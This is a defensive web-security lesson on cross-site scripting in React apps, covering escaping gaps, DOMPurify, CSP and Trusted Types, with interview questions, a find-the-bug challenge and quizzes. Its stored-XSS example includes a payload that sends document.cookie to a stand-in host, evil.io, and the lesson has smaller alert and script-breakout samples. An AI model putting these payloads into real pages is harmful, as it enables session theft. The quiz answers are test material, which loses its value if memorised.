---
title: XSS, Sanitisation and Content Security Policy
summary: How cross-site scripting works (stored, reflected, DOM-based), why React mostly protects you, where it doesn't, and how CSP and Trusted Types add defence in depth.
minutes: 20
---

## What XSS really is

**Cross-Site Scripting (XSS)** happens when an attacker gets **their JavaScript to run inside your origin**. Once it runs, it has everything your own code has: it can read the DOM, call your APIs with the user's cookies, read `localStorage` (including tokens), log keystrokes, and silently change a payee's bank account details.

The browser's security model is the **same-origin policy**: code from `https://bank.com` can read data from `https://bank.com`. XSS bypasses it by smuggling attacker code *into* `bank.com`.

:::callout analogy The forged memo
The office trusts any memo printed on company letterhead. XSS is when an outsider gets a memo printed on your letterhead — staff follow it because it looks like it came from inside.
:::

## Three flavours

| Type | Where the payload lives | Example |
|---|---|---|
| **Stored** | Saved on the server (DB), served to every viewer | A comment `<img src=x onerror="fetch('//evil.io?c='+document.cookie)">` |
| **Reflected** | In the request (URL/query) and echoed back by the server | `/search?q=<script>…</script>` rendered into the HTML |
| **DOM-based** | Never touches the server; client JS writes untrusted data into a dangerous sink | `el.innerHTML = location.hash.slice(1)` |

### Sources and sinks

Think of DOM XSS as **untrusted source → dangerous sink**:

- **Sources**: `location.*`, `document.referrer`, `postMessage` data, API responses containing user content, `localStorage`, URL params.
- **Sinks**: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout('string')`, `element.setAttribute('on…')`, `href`/`src` with `javascript:` URLs, jQuery's `$(html)`.

## Why React mostly protects you

JSX **escapes** values interpolated as text:

```jsx
const name = '<img src=x onerror=alert(1)>'
<p>{name}</p>     // renders the literal text, not an <img>
```

React sets `textContent`-equivalent values and attribute values safely. But there are escape hatches where you're on your own:

1. **`dangerouslySetInnerHTML`** — raw HTML. Only with sanitised input:

```jsx
import DOMPurify from 'dompurify'
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(markdownToHtml(post.body)) }} />
```

2. **URL attributes** — `<a href={user.website}>` with `javascript:alert(1)` executes on click (React only warns). Validate protocols:

```js
function safeUrl(url) {
  try {
    const u = new URL(url, window.location.origin)
    return ['http:', 'https:', 'mailto:'].includes(u.protocol) ? u.href : '#'
  } catch { return '#' }
}
```

3. **Refs + direct DOM** — `ref.current.innerHTML = …`.
4. **Server-rendered state injection** — `<script>window.__STATE__ = ${JSON.stringify(state)}</script>`; a string containing `</script><script>…` breaks out. Serialise with escaping of `<`, `>`, `&`, U+2028/2029 (e.g. `serialize-javascript`).
5. **Third-party libraries** that use `innerHTML` (markdown renderers, rich-text editors, chart tooltips).
6. **`eval`-like** usage and dynamic `import()` of user-controlled URLs.
7. **Spreading untrusted props**: `<div {...userControlledObject} />` could inject `dangerouslySetInnerHTML`.

## Defence in depth

1. **Output encoding by default** (frameworks), context-aware: HTML body, attribute, URL, JS, CSS contexts differ.
2. **Sanitise** any HTML you must render with an allow-list sanitizer (**DOMPurify**) — never a hand-written regex.
3. **Validate input** on the server (type, length, format) — helpful, but encoding/sanitising on output is the real defence.
4. **Content Security Policy** to limit damage if something slips through.
5. **`HttpOnly` cookies** for session tokens so injected JS can't read them.
6. **Trusted Types** to make dangerous sinks reject plain strings.

## Content Security Policy (CSP)

CSP is a response header telling the browser **which sources of script, style, images, frames and connections are allowed**. Inline scripts and `eval` are blocked unless explicitly allowed.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m123' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://images.cdn.com;
  connect-src 'self' https://api.myapp.com wss://stream.myapp.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-to csp-endpoint;
```

```html
<script nonce="r4nd0m123" src="/app.js"></script>  <!-- allowed: nonce matches -->
<script>alert(1)</script>                           <!-- blocked: no nonce -->
```

- Prefer a **strict CSP** with per-response **nonces** (or hashes) + `'strict-dynamic'` over long domain allow-lists (which are often bypassable via JSONP endpoints on allowed CDNs).
- Roll out with `Content-Security-Policy-Report-Only` first, collect violation reports, then enforce.
- `frame-ancestors 'none'` also prevents clickjacking.

## Trusted Types

Supported in Chromium browsers. With `require-trusted-types-for 'script'` in CSP, assigning a plain string to `innerHTML` throws; you must pass a `TrustedHTML` created by a policy that sanitises:

```js
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
})
el.innerHTML = policy.createHTML(userHtml)
```

This turns "remember to sanitise everywhere" into a browser-enforced rule, and makes every sink auditable.

:::question
difficulty: medium
companies: Walmart, Razorpay
### How do you prevent XSS in a React application?
- Rely on JSX escaping; never build HTML strings from user data.
- Avoid `dangerouslySetInnerHTML`; when unavoidable, sanitise with DOMPurify (allow-list), ideally at render time and on the server.
- Validate URLs for `href`/`src` (block `javascript:`/`data:`), don't spread untrusted objects as props.
- Escape server-injected state (`serialize-javascript`), avoid `eval`/`new Function`/string timers.
- Keep tokens out of JS-readable storage — `HttpOnly`, `Secure`, `SameSite` cookies.
- Deploy a strict, nonce-based **CSP** (report-only first), `object-src 'none'`, `base-uri 'self'`; consider **Trusted Types**.
- Audit third-party libraries that touch the DOM, keep dependencies updated, and add security linting (eslint-plugin-security / react/no-danger).
:::

:::question
difficulty: medium
### What's the difference between stored, reflected and DOM-based XSS?
**Stored**: malicious input is persisted on the server (comment, profile name) and served to every viewer — highest impact. **Reflected**: payload comes in the request (often a crafted link) and the server echoes it into the response — needs the victim to click. **DOM-based**: entirely client-side; JavaScript reads attacker-controlled data (URL hash, postMessage) and writes it into a sink like `innerHTML`; server logs may never see it. Defences are the same principles (encode/sanitise at the sink, CSP), but DOM XSS must be fixed in frontend code.
:::

:::question
difficulty: hard
### Why is a nonce-based CSP better than an allow-list of domains?
Allow-lists like `script-src 'self' https://cdn.jsdelivr.net https://www.google.com` are often bypassable: those domains host user-controllable content, JSONP endpoints or old library versions with gadgets that let an attacker execute script while satisfying the policy. A per-response random **nonce** (or hash) authorises specific script elements you emitted, so injected scripts can't guess it; `'strict-dynamic'` lets those trusted scripts load their dependencies. It's simpler to maintain and much harder to bypass.
:::

:::challenge
difficulty: medium
### Find the XSS vectors
```jsx
function Profile({ user }) {
  const params = new URLSearchParams(location.search)
  return (
    <div>
      <h1>{user.name}</h1>
      <a href={user.website}>Website</a>
      <div dangerouslySetInnerHTML={{ __html: user.bio }} />
      <p ref={el => el && (el.innerHTML = 'Welcome ' + params.get('ref'))} />
      <script dangerouslySetInnerHTML={{ __html: `window.user = ${JSON.stringify(user)}` }} />
    </div>
  )
}
```
@@@solution
1. `<h1>{user.name}</h1>` — **safe**, JSX escapes text.
2. `href={user.website}` — **vulnerable** to `javascript:alert(document.cookie)`. Validate protocol (`http/https` only).
3. `dangerouslySetInnerHTML={{ __html: user.bio }}` — **stored XSS**. Sanitise with DOMPurify, or render Markdown with a safe renderer.
4. `innerHTML = 'Welcome ' + params.get('ref')` — **DOM-based XSS** from the URL. Use `textContent` (or just JSX `{params.get('ref')}`).
5. Inline `JSON.stringify(user)` inside a script — a field containing `</script><script>evil()</script>` breaks out. Use an escaping serialiser or pass data via a `<script type="application/json">` element read with `JSON.parse(el.textContent)`. Also, an inline script will be blocked by a strict CSP unless nonced.
:::

:::quiz
### Which React usage is NOT protected by automatic escaping?
- [ ] <p>{comment}</p>
- [ ] <input value={comment} />
- [x] <a href={comment}>link</a> with a javascript: URL
- [ ] <img alt={comment} />
@@@explain
Attribute values are escaped, but a javascript: URL in href is still executed on click.
:::

:::quiz
### Which CSP directive prevents your site from being framed by others?
- [ ] script-src
- [ ] default-src
- [x] frame-ancestors
- [ ] child-src
@@@explain
frame-ancestors controls who may embed your page; it supersedes X-Frame-Options.
:::
